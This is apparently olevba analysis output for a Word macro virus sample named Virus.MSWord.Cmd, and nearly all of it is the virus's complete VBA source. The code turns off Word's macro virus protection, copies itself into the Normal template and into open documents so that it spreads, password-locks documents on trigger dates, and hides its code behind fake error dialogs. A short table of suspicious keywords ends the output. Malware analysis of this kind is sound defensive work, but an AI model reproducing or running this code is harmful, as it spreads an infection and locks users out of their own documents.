olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cmd-3adf3fc044a313fd3266812c605b1ba139a0d51f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cmd-3adf3fc044a313fd3266812c605b1ba139a0d51f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CMD.bas 
in file: Virus.MSWord.Cmd-3adf3fc044a313fd3266812c605b1ba139a0d51f - OLE stream: 'Macros/VBA/CMD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo CMD

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocInstalled = False
    GlobalInstalled = False

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "CMD" Then
            GlobalInstalled = True
        End If
   Next

   If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
   End If

   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CMD" Then
            DocInstalled = True
        End If
   Next

   If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
   End If
   
   If Month(Now()) = 12 And Day(Now()) = 21 Then
     MsgBox "I LOVE CHRISTY", vbOKOnly, "Christy"
     Set Pass = ActiveDocument
     Pass.Password = "CMD"
   End If
   
   If Month(Now()) = 10 And Day(Now()) = 16 Then
     MsgBox "CMD (C) DarkChasm", vbOKOnly, "Coded By: DarkChasm"
     Set Pass = ActiveDocument
     Pass.Password = "CMD"
   End If
   
   Application.DisplayAlerts = wdAlertsAll

CMD:
End Sub

Sub AutoClose()
On Error GoTo CMD

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DoctInstalled = False
    GlobalInstalled = False

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "CMD" Then
            GlobalInstalled = True
        End If
    Next
    
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CMD" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If Month(Now()) = 12 And Day(Now()) = 21 Then
      MsgBox "I LOVE CHRISTY", vbOKOnly, "Christy"
      Set Pass = ActiveDocument
      Pass.Password = "CMD"
    End If

    If Month(Now()) = 10 And Day(Now()) = 16 Then
      MsgBox "CMD (C) DarkChasm", vbOKOnly, "Coded By: DarkChasm"
      Set Pass = ActiveDocument
      Pass.Password = "CMD"
    End If

    Application.DisplayAlerts = wdAlertsAll

CMD:
End Sub

Sub FileSaveAs()

    Dialogs(wdDialogFileSaveAs).Show

On Error GoTo CMD

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocInstalled = False
    GlobalInstalled = False

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "CMD" Then
            GlobalInstalled = True
        End If
    Next
    
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "CMD" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CMD", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

   If Month(Now()) = 12 And Day(Now()) = 21 Then
     MsgBox "I LOVE CHRISTY", vbOKOnly, "Christy"
     Set Pass = ActiveDocument
     Pass.Password = "CMD"
   End If

   If Month(Now()) = 10 And Day(Now()) = 16 Then
     MsgBox "CMD (C) DarkChasm", vbOKOnly, "Coded By: DarkChasm"
     Set Pass = ActiveDocument
     Pass.Password = "CMD"
   End If

    Application.DisplayAlerts = wdAlertsAll

CMD:
End Sub

Sub ToolsMacro()
On Error GoTo CMD
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Heading = "Help"
 .Text = "You do not have permission to do this. Please refer to the instruction manual for further details."
 .Button = msoButtonSetOK
 .Show
End With

CMD:
End Sub

Sub FileTemplates()
  On Error GoTo CMD
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Heading = "Help"
 .Text = "You do not have permission to do this. Please refer to the instruction manual for further details."
 .Button = msoButtonSetOK
 .Show
End With

CMD:
End Sub

Sub ViewVBCode()
  MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

